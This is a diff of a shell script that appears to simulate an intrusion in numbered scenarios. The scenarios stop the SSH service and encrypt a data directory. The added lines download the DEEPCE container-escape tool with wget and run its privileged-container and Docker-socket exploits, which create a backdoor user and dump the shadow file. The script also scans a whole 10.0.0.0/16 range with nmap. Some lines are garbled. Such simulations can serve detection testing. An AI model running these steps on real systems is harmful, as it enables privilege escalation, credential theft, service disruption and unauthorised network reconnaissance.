@@ -182,6 +182,16 @@ service sshd stop || echo "[!] Failed to stop SSH service - Continuing..."
 echo "[*] Encrypting sensitive data..."
 tar -cf sensitive_data.tar /important_dir && openssl enc -aes-256-cbc -salt -in sensitive_data.tar -out sensitive_data.tar.enc -k [PASSWORD]
 
+# Senario 4 - DEEPCE 
+echo "[+] downloading conatiner enumeration and exploits"
+wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O deepce.sh
+chmod +x deepce.sh
+./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
+./deepce.sh --no-enumeration --exploit SOCK --shadow
+./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepcechmod +x deepce.sh
+
+
+# Senario 5 - Scanning and Discovery on network 
 ### Network Scanning Local 
 echo "[+] Starting local scanning process"
 nmap -p- 10.0.0.0/16 > localhost.txt
@@ -191,22 +201,4 @@ echo "[+] Downloading hosts list and scanning"
 wget -O url2.txt https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv
 nmap -iL url2.txt
 
-### Network Scanning Local 
-### Nmap > Local Scanning > Recon List 
-echo "[+] starting scanning processs"
-nmap -p- 10.0.0.0/16 > localhost.txt
 
-### Network Scanning ## donload address list 
-wget https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv -0 url2.txt 
-nmap -iL url2.txt
-
-### TOR Scenario 
-## Make Hidden services 
-#mkdir -p /etc/tor/hidden_service
-#echo "HiddenServiceDir /etc/tor/hidden_service
-#HiddenServicePort 80 127.0.0.1:8080" > /etc/tor/torrc
-# Start Hidden to Service 
-#tor & 
-# verify the hostname is correct 
-#sleep 10 
-#cat /etc/tor/hidden_service/hostname
